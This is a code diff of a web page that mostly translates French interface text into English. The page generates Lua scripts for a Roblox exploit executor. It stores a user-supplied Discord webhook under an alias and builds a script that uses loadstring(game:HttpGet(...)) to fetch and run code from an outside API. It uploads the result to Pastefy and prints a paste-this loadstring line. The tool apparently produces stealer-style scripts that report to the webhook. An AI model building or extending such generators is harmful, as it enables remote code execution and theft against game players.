@@ -820,7 +820,7 @@ function updateCustomAdmin() {
     }
 
     const data = await response.json();
-    return `https://pastefy.app/${data.data.id}/raw`;
+    return `https://pastefy.app/${data.data.id}/raw`; // Lien raw du paste
   } catch (error) {
     console.error("Pastefy upload error:", error);
     return null;
@@ -832,20 +832,20 @@ function updateCustomAdmin() {
 
   if (btn.disabled) return;
   btn.disabled = true;
-  btn.textContent = '⏳ Génération en cours...';
+  btn.textContent = '⏳ Generating...';
   btn.style.opacity = '0.6';
 
   try {
     const username = document.getElementById('usernameInput').value.trim();
     const webhook = document.getElementById('webhookInput').value.trim();
 
-    if (selected.size === 0) throw new Error('-- Veuillez sélectionner au moins un animal brainrot.');
-    if (!validateUsername()) throw new Error('-- Le nom d\'utilisateur doit faire au moins 3 caractères.');
-    if (!validateWebhook()) throw new Error('-- Le webhook doit commencer par https://discord.com/api/webhooks/');
+    if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
+    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
+    if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
     const alias = generateAlias();
 
-    // Étape 1 : Stocker le webhook dans ton KV Worker
+    // Store webhook
     const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: {
@@ -855,9 +855,9 @@ function updateCustomAdmin() {
       body: JSON.stringify({ alias, url: webhook })
     });
 
-    if (!kvResponse.ok) throw new Error('Échec du stockage du webhook.');
+    if (!kvResponse.ok) throw new Error('Failed to store webhook.');
 
-    // Étape 2 : Générer le script Lua
+    // Generate script
     const names = [...selected];
     const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -881,21 +881,19 @@ loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab7
 ${adminScriptPart}
 `;
 
-    // Étape 3 : Upload du script sur Pastefy
+    // Upload to Pastefy
     const pastefyRawUrl = await uploadToPastefy(script);
 
     if (pastefyRawUrl) {
-      // Afficher le lien raw dans la sortie
       out.className = 'code-block';
-      out.textContent = `-- Script uploadé sur Pastefy avec succès !
--- Copie ce loadstring dans ton exploiter :
+      out.textContent = `-- Script generated successfully!
+Copy this loadstring into your executor:
 
 loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
     } else {
-      // Si l'upload échoue, afficher le script brut
       out.className = 'code-block';
-      out.textContent = `-- Échec de l'upload sur Pastefy.
--- Voici le script brut (copie-le manuellement) :
+      out.textContent = `-- Failed to upload to Pastefy.
+Here is the raw script (copy it manually):
 
 ${script}`;
     }
@@ -903,11 +901,11 @@ ${script}`;
   } catch (err) {
     console.error(err);
     out.className = 'code-block empty';
-    out.textContent = err.message || '-- Une erreur est survenue lors de la génération.';
+    out.textContent = err.message || 'An error occurred.';
   } finally {
     setTimeout(() => {
       btn.disabled = false;
-      btn.textContent = '⚡ Générer le Script';
+      btn.textContent = '⚡ Generate Script';
       btn.style.opacity = '1';
     }, 1500);
   }
